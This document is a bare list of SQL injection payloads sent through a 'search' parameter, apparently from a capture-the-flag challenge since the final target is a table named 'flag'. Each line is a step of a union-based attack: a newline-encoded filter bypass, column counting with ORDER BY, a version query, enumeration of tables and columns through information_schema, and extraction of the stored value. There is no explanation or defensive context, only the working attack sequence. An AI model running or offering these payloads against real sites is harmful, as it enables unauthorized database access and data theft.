search=a%0a' #
search=a%0a' order by 10 #
search=a%0a' order by 1 #
search=a%0a' union select @@version #
search=a%0a' union select group_concat(table_name,'\n') from information_schema.tables #
search=a%0a' union select group_concat(table_name,'\n') from information_schema.tables where table_name like '%fl%' #
search=a%0a' union select group_concat(column_name,'\n') from information_schema.columns where table_name = 'flag' #
search=a%0a' union select flag from flag #
